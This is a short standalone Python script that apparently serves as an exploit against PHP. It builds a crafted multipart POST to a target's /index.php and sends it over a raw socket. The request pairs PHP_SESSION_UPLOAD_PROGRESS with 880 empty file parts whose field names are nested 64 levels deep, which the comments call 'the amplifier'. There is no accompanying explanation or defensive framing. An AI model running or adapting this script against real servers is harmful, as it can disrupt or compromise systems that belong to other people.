#!/usr/bin/env python3
import socket, sys
HOST, PORT = sys.argv[1], int(sys.argv[2])
BND = b"C" * 10

def part(name, value=b"", filename=None, ctype=None):
    h = b"--" + BND + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
    if filename is not None: h += b'; filename="' + filename + b'"'
    if ctype is not None:    h += b"\r\nContent-Type: " + ctype
    return h + b"\r\n\r\n" + value + b"\r\n"

body  = part(b"PHPSESSID", b"a" * 32)
body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
body += b"".join(part(b"%03d" % i, b"x") for i in range(115))          # filler
for i in range(880):                                                   # the amplifier
    name = (b"files[R%05d]" % i) + b"[a]" * 62                         # 64-deep nest
    body += part(name, b"", filename=b"", ctype=b"application/octet-stream")
body += b"--" + BND + b"--\r\n"

req = (b"POST /index.php HTTP/1.1\r\nHost: x\r\n"
       b"Content-Type: multipart/form-data; boundary=" + BND + b"\r\n"
       b"Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body)) + body
s = socket.create_connection((HOST, PORT)); s.sendall(req)
try:
    while s.recv(65536): pass
except OSError: pass
